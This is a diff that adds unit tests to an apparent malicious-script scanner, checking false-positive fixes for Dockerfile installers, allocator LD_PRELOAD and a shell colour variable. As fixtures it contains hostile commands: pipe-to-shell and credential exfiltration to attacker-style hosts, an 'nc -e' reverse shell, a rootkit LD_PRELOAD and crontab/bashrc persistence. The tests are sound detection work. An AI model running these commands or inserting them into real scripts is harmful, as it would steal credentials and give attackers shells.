@@ -19,6 +19,29 @@ def test_detects_obfuscation_and_download_exec():
     assert "download_exec" in cats
 
 
+def test_benign_dockerfile_idioms_are_not_flagged():
+    # 2026-07-06 docker FP audit: standard Docker build lines were confirming as
+    # download_exec / exfiltration. `curl -f ... | bash` from a reputable installer
+    # host and a `curl -f http://localhost/health` HEALTHCHECK are both benign.
+    benign = (
+        "RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash -\n"
+        "HEALTHCHECK CMD curl -f http://localhost:8000/health || exit 1\n"
+        "RUN curl -fsSL https://sh.rustup.rs | sh\n"
+    )
+    assert score_findings(scan_text(benign)) == 0
+    cats = {f.category for f in scan_text(benign)}
+    assert "download_exec" not in cats and "exfiltration" not in cats
+
+
+def test_real_malware_still_flagged_after_docker_fp_fix():
+    # The fix must not blunt real detections: an attacker-host pipe-to-shell and a
+    # genuine POST of data still confirm.
+    evil = ("RUN curl -fsSL https://evil-c2.tld/stage2 | bash\n"
+            "curl -d @/root/.aws/credentials https://exfil.tld/u\n")
+    cats = {f.category for f in scan_text(evil)}
+    assert "download_exec" in cats and "exfiltration" in cats
+
+
 def test_detects_persistence():
     text = "echo 'evil' >> ~/.bashrc\n(crontab -l; echo '@reboot /tmp/x') | crontab -"
     cats = {f.category for f in scan_text(text)}
@@ -28,6 +51,30 @@ def test_detects_persistence():
 def test_clean_script_scores_zero():
     text = "#!/bin/bash\necho 'building project'\nmake all\nexit 0"
     assert score_findings(scan_text(text)) == 0
+
+
+def test_ld_preload_allocator_is_not_process_injection():
+    # The aristoteleo/pantheonos FP (2026-07-02): LD_PRELOAD of a memory
+    # allocator (jemalloc/tcmalloc/mimalloc) is a standard Dockerfile perf
+    # tweak, not process injection. A real LD_PRELOAD of an unknown .so still fires.
+    for legit in ("LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2 myapp",
+                  "ENV LD_PRELOAD=/usr/lib/libtcmalloc.so.4",
+                  "LD_PRELOAD=/usr/lib/libmimalloc.so python app.py"):
+        cats = {f.category for f in scan_text(legit)}
+        assert "process_injection" not in cats, legit
+    evil = {f.category for f in scan_text("LD_PRELOAD=/tmp/.hidden/rootkit.so /bin/ls")}
+    assert "process_injection" in evil
+
+
+def test_nc_color_variable_is_not_reverse_shell():
+    # The shai-hulud-detect FP (2026-07-02): "${NC}" is the standard shell
+    # convention for a "No Color" ANSI reset variable; an unrelated "-e" later
+    # on the same line (prose about Bash's `set -e`) must not complete a false
+    # nc-exec match. A real `nc -e ...` invocation still must be caught.
+    text = 'echo -e "${GREEN}PASS${NC}: completes a full scan (no set -e abort)"'
+    cats = {f.category for f in scan_text(text)}
+    assert "reverse_shell" not in cats
+    assert "reverse_shell" in {f.category for f in scan_text("nc -e /bin/sh attacker.tld 9001")}
 
 
 def test_scan_repo_finds_bash_bearing_files(tmp_path):
